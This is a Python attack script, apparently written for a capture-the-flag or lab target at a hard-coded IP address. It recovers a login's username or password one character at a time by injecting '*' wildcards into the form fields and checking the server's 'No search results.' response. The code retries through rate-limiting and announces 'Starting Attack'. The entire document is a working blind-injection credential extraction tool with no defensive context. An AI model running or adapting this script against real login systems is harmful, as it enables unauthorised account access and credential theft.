# Arijit-Bhowmick [sys41x4]

import requests
import time

url = "http://167.71.136.52:30105/login"

user_name, passwd =  "", ""

#data = {"username":user_name, "password":passwd} # For testing purpose

#num_characters = (48 - 57)
#alphabet_chr = (65-90)/(97-122)
#special_characters = (32–47 / 58–64 / 91–96 / 123–126)

char = ''

chr_num_dict= {97:122, 65:90, 48:57, 32:47, 58:64, 91:96, 123:126}

for start in chr_num_dict.keys():
        for j in range(start, chr_num_dict[start]+1):
                char+=chr(j)

char=char.replace("*", '')


def chr_selector(track):

        return char[track]


def cred_finder(cred_to_find):

        global user_name
        global passwd



        test_user = ''
        track = 0


        if cred_to_find == "user_name":

                pass_character = ''
                validate_usr = ''
                validate_pass = "*"

                try:
                        if passwd[-1] != "*":

                                passwd += "*"

                except:
                        pass


        elif cred_to_find == "passwd":

                usr_character = ''
                validate_usr = "*"
                validate_pass = ''

                try:
                        if user_name[-1] != "*":
                                user_name += "*"
                except:
                        pass

        else:

                exit()



        while True:

                try:
                        if cred_to_find == "user_name":

                                usr_character = chr_selector(track)

                        elif cred_to_find == "passwd":

                                pass_character = chr_selector(track)


                        r_ = requests.post(url, data={"username":user_name+usr_character+"*", "password":passwd+pass_character+"*"})


                        if  (r_.status_code == 200) and ("No search results." in r_.text):

                                user_name+=usr_character
                                passwd+=pass_character

                                r = requests.post(url, data={"username":user_name+validate_usr, "password":passwd+validate_pass})

                                track=0

                                print(f"Partially valid --> USERNAME : {user_name.replace('*', '')} | PASSWORD : {passwd.replace('*', '')}")

                                if (r.status_code == 200) and ("No search results." in r.text):
                                        print(f"valid --> USERNAME : {user_name} | PASSWORD : {passwd}")

                                        break


                                else:
                                        track+=1

                        else:
                                #print(f"Invalid --> USERNAME : {user_name+usr_character} | PASSWORD : {passwd+pass_character}") # For testing purpose
                                track+=1

                except KeyboardInterrupt:
                        exit()

                except:

                        # If the host is not available due to excessive brutefore attack
                        # then it will wait some time to send another request
                        wait=5
                        time.sleep(wait)
                        print(f"\nCouldn\'t able to reach {url}   |  Waiting for {wait} seconds\n")


print("Starting Attack\n")

#cred_finder('user_name') # Find the Username
cred_finder('passwd') # Find the Passwd
